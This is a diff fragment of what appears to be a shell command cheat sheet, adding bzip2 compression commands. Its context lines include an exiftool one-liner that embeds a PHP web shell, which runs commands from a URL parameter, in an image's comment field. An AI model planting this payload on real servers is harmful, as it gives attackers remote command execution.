@@ -49,3 +49,7 @@ find -not -empty -type f -printf "%s\n" | sort -rn | uniq -d | xargs -I{} -n1 fi
 
 # Insert PHP payload with exiftool:
 exiftool -Comment='<?php system($_GET['do']); ?>' img.jpg
+
+# Compression:
+bzip2 [FILE/FOLDER]
+bunzip2 [FILE/FOLDER]
